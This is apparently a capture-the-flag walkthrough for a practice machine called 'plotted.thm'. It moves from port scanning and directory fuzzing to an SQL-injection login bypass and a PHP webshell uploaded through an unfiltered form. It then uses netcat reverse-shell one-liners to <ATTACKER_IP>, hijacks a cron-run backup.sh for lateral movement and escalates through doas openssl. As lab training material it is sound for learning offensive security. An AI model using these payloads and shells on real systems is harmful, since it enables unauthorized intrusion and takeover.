# Enumeration

## \[+] 10.10.215.21 - plotted.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.215.21 plotted.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.215.21
```

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 445 - HTTP

Just a default Apache page, so let's try directory/file fuzzing using [feroxbuster](https://github.com/epi052/feroxbuster) with this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-2.3-medium.txt):

```sh
feroxbuster -u http://plotted.thm:445 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x json,txt,js,xml -s 200,301,302,403 -o p-445-www-ferox.txt
```

After a moment, we should find the "Traffic Offense Management System" and admin panel directories:

![c35b165bf246c96e070f417c4b5918cd.png](/resources/c0ba0057132d4ff1ba40951375e2a8de.png)

### \[-] plotted.thm:445/management/

![4b627d472c59a7de3a5255a2c2a61834.png](/resources/861d4aff22f44f39aefc98f1b73d76e1.png)

To inspect the website further, we can use a proxy tool like [Burp Suite](https://portswigger.net/burp) or [ZAP](zaproxy.org/) - I will be using ZAP.

### \[-] plotted.thm:445/management/admin/login.php

After clicking the "Login" button on the `/management/` page, we can access the administration login portal. Copy the URL and in ZAP, click on the "Quick Start" tab, select "Manual Explore", then paste the URL and click "Launch Browser":

![1ab74f78e3717347266f38b1c4455e30.png](/resources/7b7861f9b34f4b39b3fe0a06319120c3.png)

When the login page loads, let's try to login as user "`test`" with the password "`test`" and see what the request/response looks like in ZAP:

![cec620d73eaae20b88383c4efa7fdce4.png](/resources/04d8318273f147e5b7bdaa559b25f38b.png)

The request is normal `POST` request with the `username` and `password` parameter:

![9f2461ef196b420057dd6d1ed49aad03.png](/resources/13514eceb7a44e289c39725b2e422d91.png)

But, the response shows our input is directly inserted into an SQL statement:

![b5973ae954a9c4e5e5eab78f28ba9872.png](/resources/eb06356cd96c474a87c2c4694fb8c569.png)

This means we can inject a malicious payload that will allow us to bypass the login. If we try the username: `admin' or '1'='1'#` with any password, we will be logged in as `admin`. We can see how this works by comparing our test response with the malicious one.

Original response:

```mysql
SELECT * from users where username = 'test' and password = md5('test')
```

Malicious reponse:

```mysql
SELECT * from users where username = 'admin' or '1'='1'#' and password = md5('test')
```

If you notice the syntax highlighting after the hash character (`#`) is different because that part of the SQL statement has been made a comment and is no longer a part of the statement. Now, the first part of the statement is only checking to see if our username is `admin` or if the number one is equal to one, which returns true and makes our statement true which allows us to log in without a password.

Now, let's try it on the login page by entering `admin' or '1'='1'#` as the username and anything or blank for the password, then click the "Sign In" button:

![d0ca60e2dc8af822a125721e3efc81e1.png](/resources/07e22c32ef5840aba6903e135d67fd6e.png)

![a3d3245bfaa00a9cb7ea7e33f1e29f3d.png](/resources/35454e2080b04101b60bb1a40c97ccb7.png)

# Initial Foothold

### \[-] plotted.thm:445/management/admin/?page=system\_info

To get a webshell, we can use the upload function for either the "System Logo" or "Potal Cover" under the "Settings" page:

![63cd6db1e3377643a27977a1e617ab52.png](/resources/54b1d2932dc34923914a467be71f7d1e.png)

The upload function does not filter the filetypes and allows any kind of file to be uploaded. We will be using this basic PHP webshell:

```php
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="x">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if($_REQUEST['x']) {
  system($_REQUEST['x']);
  } else phpinfo();
?>
</pre>
</BODY></HTML>
```

Save the above code to a text file named "`webshell.php`" then upload it:

![dfb0bd2bf43b886993f96d68c1386570.png](/resources/03754bf65cbd4d9d91c3c182146f0c26.png)

After clicking the "Update" button, right-click on the white square that replaced the original image, then click on "Open Image in New Tab" which will open a new tab with our webshell:

![52f049cf4a8c819f4d8fbe5ca9044964.png](/resources/7f647c5b335644cab319b3ffcfd141d3.png)

### \[-] www-data\@plotted

To get a reverse shell, we will first start our [Netcat](https://linux.die.net/man/1/nc) listener on our attacking machine:

```sh
nc -nvlp 4444
```

Then on the webshell we send the command:

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

![00b572fc0210c3c91fff7f93d94cc93f.png](/resources/9e941a2b11be44e09a674976c2de8b20.png)

After pressing the "Send" button, we check back to our Netcat listener for the connection from the victim machine:

![f3ad9082e9d82396e45cc0669bc39aea.png](/resources/0360cb1588b7470f85ae65250c807d9c.png)

Let's stablize the shell we just got by doing the following steps:

1. `python3 -c 'import pty;pty.spawn("/bin/bash")'` ... Use Python to spawn a stable shell
2. `CTRL + Z` ... Backgrounds the current shell
3. `stty raw -echo;fg` ... Fixes echoing and foregrounds the shell
4. `export TERM=xterm-256color` ... Sets terminal to xterm

# Privilege Escalation

### \[-] plot\_admin\@plotted

After some enumeration, we will find a script named "`backup.sh`" in the `/var/www/scripts/` directory. The script is using rsync to make a backup of the `/var/www/html/management` directory and saving it to `/home/plot_admin/tms_backup`:

```sh
cat /var/www/scripts/backup.sh
```

![84662c1f13299a9fb26c3d2536b2bfcd.png](/resources/5ac7b789a8bb4d87982c966f5af7c0a2.png)

Checking the permissions of the script shows that it is owned by the user `plot_admin`:

```sh
ls -lah /var/www/scripts/backup.sh
```

![cbb16646ef50365878276e05a00efe04.png](/resources/d846e3b2db1948dc89f90f09e54cbdd2.png)

But, if we check the permissions of the `/var/www/scripts/` directory, it is owned by our current user, `www-data` which means we have the permissions to modify anything in the directory:

```sh
ls -lah /var/www/scripts/
```

![59d1d4a84fad66844222611b60c1e04a.png](/resources/1e59b2a3e93f43d3a260fb0d919ebc8e.png)

We can delete the contents of the directory and create our own `backup.sh` script to send us a reverse shell and when the script is ran by the user `plot_admin`, we will get a connection as the same user.

First, let's delete the contents by using the rm command:

```sh
rm -rf /var/www/scripts/
```

On our attacking machine, lets open a new terminal with a Netcat listener on port 4445:

```sh
nc -nvlp 4445
```

We will create a new text file with the following code and save it as `backup.sh`:

```sh
#!/usr/bin/env bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4445 >/tmp/f
```

Next, we can use [base64](https://linux.die.net/man/1/base64) command to encode our script:

```sh
base64 -w 0 backup.sh
```

![9acb1cd559ac6343e94f5cfe659b88dd.png](/resources/a7f6a4ed504c4f20a3cbb7b73ddc0660.png)

This will output a long base64 string which we will copy to the clipboard. Switch to the terminal that is connected to the victim machine and use the following command to decode the base64 string and save it to `backup.sh` and make the script executable using `chmod`:

```sh
echo '<BASE64_STRING>' | base64 -d > backup.sh
chmod +x backup.sh
```

Checking the `/etc/crontab` file shows the script is running every minute:

```sh
cat /etc/crontab
```

![9db292b0522ef71c3f5fa89012ccb78b.png](/resources/55540e7f11a641b5b9c39f7becd49a15.png)

After a minute we should get a connection back on our Netcat listener:

![a9f63097ccf4e7a1e40a928f51900248.png](/resources/0758c9fa5a0146bbae5a83b954bd66a4.png)

Let's stablize the shell again:

1. `python3 -c 'import pty;pty.spawn("/bin/bash")'` ... Use Python to spawn a stable shell
2. `CTRL + Z` ... Backgrounds the current shell
3. `stty raw -echo;fg` ... Fixes echoing and foregrounds the shell
4. `export TERM=xterm-256color` ... Sets terminal to xterm

We can get the flag in `/home/plot_admin/user.txt`:

```sh
cat /home/plot_admin/user.txt
```

![122a63bfdde28d7e230cdb3113458d13.png](/resources/b08c13489c5740619b345c5e2b33b695.png)

### \[-] root\@plotted

In the `/etc/` directory we will find the `doas.conf` configuration file which has a similar function as the `sudoers` file which allows the user granular control over user permissions. Checking the contents of this file shows the user `plot_admin` is allowed to run the [openssl](https://linux.die.net/man/1/openssl) binary as the user `root` without a password:

```sh
cat /etc/doas.conf
```

We can use `openssl` combined with the `doas` privileges to read the last flag in the `/root/` directory by running the command:

```sh
doas openssl enc -in "/root/root.txt"
```

![d674f58ff5d5df860e8c263e36727647.png](/resources/7fd7a4ce35d84a64a6f0e393389c674c.png)
